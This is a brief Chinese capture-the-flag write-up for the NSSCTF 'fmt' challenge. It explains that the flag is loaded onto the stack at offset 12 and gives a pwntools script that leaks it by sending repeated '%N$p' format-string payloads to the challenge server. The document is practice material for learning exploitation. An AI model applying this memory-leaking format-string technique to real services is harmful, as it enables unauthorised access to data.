[[HUBUCTF 2022 新生赛]fmt | NSSCTF](https://www.nssctf.cn/problem/2599)
![[Pasted image 20240901211414.png]]
挺有特点的一道题目，反编译后可以看出代码打开了flag.txt,然后再其不为空的时候将其存到s中，打本地可以自己创建一个flag.txt，具体到栈中看
![[Pasted image 20240901211621.png]]
可以看到flag被存入栈中，偏移为12
![[Pasted image 20240901211725.png]]
只要不断利用格式化字符串漏洞就可以泄露栈上的flag
exp:
```python
from pwn import *

# context(arch='amd64', os='linux', log_level='debug')
elf = ELF('./fmt')
local = False
if local:
    p = process('./fmt')
    # pwnlib.gdb.attach(p, 'b main')
else:
    p = remote("node5.anna.nssctf.cn", 26287)
shell = 0xA56
flag = ''
j = 12
while True:
    payload = '%{}$p'.format(j)
    p.recvuntil(b'service')
    p.sendline(payload)
    p.recvuntil(b'0x')
    part = p.recvuntil(b'\n')[:-1]
    for i in range(0, len(part), 2):
        index = len(part) - i
        flag += chr(int(part[index - 2:index].ljust(2, b'0'), 16))
    print(flag)
    j += 1
    if '}' in flag:
        break
```
